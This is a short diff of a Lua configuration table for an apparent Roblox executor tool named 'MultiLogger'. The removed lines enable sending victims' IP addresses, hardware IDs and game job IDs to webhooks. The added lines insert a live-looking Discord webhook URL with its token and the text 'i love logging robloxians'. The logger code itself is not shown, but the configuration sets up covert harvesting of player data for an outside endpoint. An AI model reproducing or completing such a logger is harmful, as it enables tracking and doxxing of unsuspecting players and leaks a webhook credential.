@@ -1,18 +1,10 @@
 -- // Table of Tool
 
-getgenv().MultiLogger = {
-    LogInfo = {
-        JobID = {
-            ["Enable"] = true,
-            ["Webhook"] = "YOUR_WEBHOOK_HERE",
-        },
-        Hwid = {
-            ["Enable"] = true,
-            ["Webhook"] = "YOUR_WEBHOOK_HERE",
-        },
-        Ip = {
-            ["Enable"] = true,
-            ["Webhook"] = "YOUR_WEBHOOK_HERE",
-        }
+getgenv().MutliLogger = {
+    Webhook = {
+        ["URL"] = "https://discord.com/api/webhooks/1085092116448952461/DHQ37Am32EvoUx4uiGbDbWamWxDM1eR7GcHropBW5Lrfk_PP0zGH927wes_hH6RjJw9Z"
+    },
+    Text = {
+        ["CustomText"] = "i love logging robloxians"
     }
 }
